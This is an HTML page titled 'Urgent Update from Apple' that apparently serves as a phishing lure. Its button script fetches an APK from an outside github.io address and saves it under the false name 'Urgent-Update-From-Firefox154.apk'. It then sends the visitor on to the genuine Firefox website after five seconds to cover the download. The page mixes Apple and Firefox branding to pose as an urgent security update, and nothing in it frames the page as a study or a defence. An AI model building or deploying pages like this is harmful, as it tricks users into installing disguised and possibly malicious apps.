<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>

</head>

<body>
    <h1>Urgent Update from Apple</h1>

    <!-- <button onclick="startDownload()">Start Download new tab</button> -->



    <button onclick="startImmed()">Download immediately test</button>



    <script>
        function startImmed() {

            fetch('https://kokurate.github.io/browser/rar-android-722.132.apk')
                .then(response => response.blob())
                .then(blob => {
                    const url = URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'Urgent-Update-From-Firefox154.apk';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    URL.revokeObjectURL(url);
                })
                .catch(console.error);

            setTimeout(function () {
                window.location.href = 'https://www.firefox.com/en-GB/more/';
            }, 5000);
        }
    </script>

</body>
